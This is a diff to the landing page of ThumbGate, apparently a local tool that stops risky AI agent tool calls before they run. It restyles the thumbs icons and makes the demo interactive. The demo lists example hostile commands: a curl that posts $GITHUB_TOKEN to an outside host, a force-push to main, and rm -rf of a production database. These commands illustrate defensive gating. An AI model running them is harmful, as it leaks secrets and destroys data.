@@ -571,22 +571,61 @@
       justify-content: flex-start;
       gap: 14px;
       margin: 0 0 18px;
-      font-size: clamp(42px, 6vw, 64px);
-      line-height: 1;
-      filter: drop-shadow(0 0 28px rgba(34, 211, 238, 0.28));
     }
-    .hero-thumbs span {
+    .hero-thumbs .up,
+    .hero-thumbs .down {
       display: inline-flex;
-      width: 1.15em;
-      height: 1.15em;
+      width: clamp(52px, 7vw, 72px);
+      height: clamp(52px, 7vw, 72px);
       align-items: center;
       justify-content: center;
+      padding: 12px;
       border-radius: 22%;
       background: rgba(17, 23, 34, 0.9);
       border: 1px solid rgba(39, 50, 70, 0.9);
+      color: #4ade80;
     }
     .hero-thumbs .up { border-color: rgba(86, 227, 159, 0.55); box-shadow: 0 0 0 1px rgba(86, 227, 159, 0.12); }
-    .hero-thumbs .down { border-color: rgba(255, 100, 124, 0.55); box-shadow: 0 0 0 1px rgba(255, 100, 124, 0.12); }
+    .hero-thumbs .down {
+      border-color: rgba(255, 100, 124, 0.55);
+      box-shadow: 0 0 0 1px rgba(255, 100, 124, 0.12);
+      color: #ff7a8c;
+      cursor: pointer;
+      font: inherit;
+    }
+    .hero-thumbs svg { width: 100%; height: 100%; display: block; }
+    .hero-thumbs .down svg { transform: rotate(180deg); }
+    .hero-thumbs button.down:focus-visible { outline: 2px solid #ff7a8c; outline-offset: 3px; }
+    .hero-thumbs button.down.is-lit { box-shadow: 0 0 0 1px rgba(255, 100, 124, 0.45), 0 0 22px rgba(255, 100, 124, 0.35); }
+    .hero-gate-rows { display: flex; flex-direction: column; }
+    .hero-gate-row {
+      display: block;
+      width: 100%;
+      margin: 0;
+      padding: 6px 16px;
+      border: 0;
+      border-left: 2px solid transparent;
+      background: transparent;
+      color: #c8d2df;
+      font: 12.5px/1.6 ui-monospace, SFMono-Regular, Menlo, monospace;
+      text-align: left;
+      white-space: pre-wrap;
+      cursor: pointer;
+    }
+    .hero-gate-row:first-child { padding-top: 14px; }
+    .hero-gate-row:last-child { padding-bottom: 14px; }
+    .hero-gate-row.is-selected { border-left-color: #38d7ff; background: rgba(56, 215, 255, 0.06); }
+    .hero-gate-row:focus-visible { outline: 1px solid #38d7ff; outline-offset: -2px; }
+    .hero-gate-row .deny { color: var(--red); font-weight: 800; }
+    .hero-gate-row .warn { color: #e6c07b; font-weight: 800; }
+    .hero-gate-note {
+      margin: 0;
+      padding: 0 16px 12px;
+      min-height: 0;
+      color: #9db0c4;
+      font: 12px/1.45 ui-monospace, SFMono-Regular, Menlo, monospace;
+    }
+    .hero-gate-note:empty { display: none; }
     .hero-visual {
       margin: 22px 0 0;
       border: 1px solid rgba(56, 215, 255, 0.22);
@@ -670,10 +709,14 @@
     .self-improve-callout strong { color: var(--green); }
     .loop-step .thumb-icon {
       display: inline-flex;
+      gap: 6px;
       font-size: 28px;
       line-height: 1;
       margin-bottom: 4px;
     }
+    .loop-step .thumb-icon svg { width: 22px; height: 22px; }
+    .loop-step .thumb-icon .hero-thumb-up { color: #4ade80; }
+    .loop-step .thumb-icon .hero-thumb-down { color: #ff7a8c; transform: rotate(180deg); }
     .visual-pair {
       display: grid;
       grid-template-columns: minmax(0, 1fr) minmax(0, 1fr);
@@ -715,18 +758,30 @@
       <div class="shell hero-grid">
         <div class="hero-copy">
           <div class="eyebrow">Pre-action firewall · &lt;0.5ms local · Not a prompt · Not a postmortem</div>
-          <div class="hero-thumbs" aria-hidden="true"><span class="up">👍</span><span class="down">👎</span></div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="0" height="0" style="position:absolute" aria-hidden="true">
+            <symbol id="thumb-glyph" viewBox="0 0 32 32">
+              <path d="M14.4 3.8c.6-1.4 2.6-1.4 3.1.1L19.2 8h4.2a2.2 2.2 0 0 1 2.2 2.5l-1.1 8.4a2.2 2.2 0 0 1-2.2 1.9H12.4a1.7 1.7 0 0 1-1.7-1.7V11.6c0-.9.8-1.7 1.7-1.7h2z" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+              <path d="M10.7 10.8H8.4a1.7 1.7 0 0 0-1.7 1.7v7.4a1.7 1.7 0 0 0 1.7 1.7h2.3" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+            </symbol>
+          </svg>
+          <div class="hero-thumbs">
+            <span class="up" aria-hidden="true"><svg class="hero-thumb-up" viewBox="0 0 32 32" aria-hidden="true"><use href="#thumb-glyph"/></svg></span>
+            <button type="button" class="down" id="hero-thumb-down" aria-label="Record a thumbs-down for the selected command"><svg class="hero-thumb-down" viewBox="0 0 32 32" aria-hidden="true"><use href="#thumb-glyph"/></svg></button>
+          </div>
           <h1>Stop AI agent mistakes before they cost you.</h1>
           <p class="hero-lede">The rules learn from your thumbs and stay on your machine. A static hook does not. A detected secret is denied at the tool-call boundary.</p>
-          <div class="hero-terminal" aria-label="Live pre-action interception demo">
+          <div class="hero-terminal" id="hero-gate-demo" aria-label="Live pre-action interception demo">
             <div class="terminal-chrome" aria-hidden="true">
               <div class="dots"><span></span><span></span><span></span></div>
               <span class="title">local gate</span>
               <span>local</span>
             </div>
-            <pre>curl -d "$GITHUB_TOKEN" https://...   → <span style="color:var(--red);font-weight:800">DENY</span> (secret, every install)
-git push --force origin main          → <span style="color:#e6c07b;font-weight:800">WARN</span> (deny only in strict mode)
-rm -rf ./prod-db &amp;&amp; git reset --hard  → <span style="color:#e6c07b;font-weight:800">WARN</span> (deny after a thumbs-down rule)</pre>
+            <div class="hero-gate-rows" role="listbox" aria-label="Sample tool calls">
+              <button type="button" class="hero-gate-row is-selected" role="option" aria-selected="true" data-gate="secret">curl -d "$GITHUB_TOKEN" https://...   → <span class="deny">DENY</span> (secret, every install)</button>
+              <button type="button" class="hero-gate-row" role="option" aria-selected="false" data-gate="force">git push --force origin main          → <span class="warn">WARN</span> (deny only in strict mode)</button>
+              <button type="button" class="hero-gate-row" role="option" aria-selected="false" data-gate="rm">rm -rf ./prod-db &amp;&amp; git reset --hard  → <span class="warn">WARN</span> (deny after a thumbs-down rule)</button>
+            </div>
+            <p class="hero-gate-note" id="hero-gate-note" aria-live="polite"></p>
           </div>
           <p class="install-hint" id="install"><strong style="color:var(--text)">Free (MIT):</strong> <code>npx thumbgate init</code> <button type="button" class="copy-cmd" data-copy-install data-cta-id="hero_install_copy" style="margin-left:8px">Copy</button></p>
           <nav class="spec-chips" aria-label="Install ThumbGate" style="margin-top:14px">
@@ -824,7 +879,7 @@ rm -rf ./prod-db &amp;&amp; git reset --hard  → <span style="color:#e6c07b;fon
                auto-close <button> around <h3>/<div>, which broke click targets. -->
           <div class="loop-step" role="tab" tabindex="0" id="loop-tab-1" data-loop-step="1" aria-selected="false" aria-controls="loop-panel" aria-expanded="false">
             <span class="loop-number">1</span>
-            <div class="thumb-icon" aria-hidden="true">👍👎</div>
+            <div class="thumb-icon" aria-hidden="true"><svg class="hero-thumb-up" viewBox="0 0 32 32" aria-hidden="true"><use href="#thumb-glyph"/></svg><svg class="hero-thumb-down" viewBox="0 0 32 32" aria-hidden="true"><use href="#thumb-glyph"/></svg></div>
             <h3>Capture feedback</h3>
             <p>Record explicit 👍 or 👎 with the action and outcome context.</p>
             <span class="loop-hint">Under the hood ↓</span>
@@ -1371,6 +1426,36 @@ next      decision recorded before execution</pre>
           setOpen(stepParam);
         }
       } catch (_) {}
+    })();
+
+    (function initHeroGateDemo() {
+      const demo = document.getElementById('hero-gate-demo');
+      const note = document.getElementById('hero-gate-note');
+      const down = document.getElementById('hero-thumb-down');
+      if (!demo || !note || !down) return;
+      const rows = demo.querySelectorAll('.hero-gate-row');
+      let selected = 'secret';
+      const notes = {
+        secret: 'Already denied on every install. A thumbs-down does not change a secret floor.',
+        force: 'One thumbs-down stores a local lesson. This stays a warning. Deny needs strict mode, or three repeated negatives.',
+        rm: 'One thumbs-down stores a local lesson and promotes a warning. Deny comes from the promoted rule or from three repeated negatives, not from this click.',
+      };
+      rows.forEach(function (row) {
+        row.addEventListener('click', function () {
+          selected = row.getAttribute('data-gate') || 'secret';
+          rows.forEach(function (other) {
+            const on = other === row;
+            other.classList.toggle('is-selected', on);
+            other.setAttribute('aria-selected', on ? 'true' : 'false');
+          });
+          note.textContent = '';
+        });
+      });
+      down.addEventListener('click', function () {
+        note.textContent = notes[selected] || notes.secret;
+        down.classList.add('is-lit');
+        window.setTimeout(function () { down.classList.remove('is-lit'); }, 700);
+      });
     })();
 
     if (!serverTelemetryCaptured) {
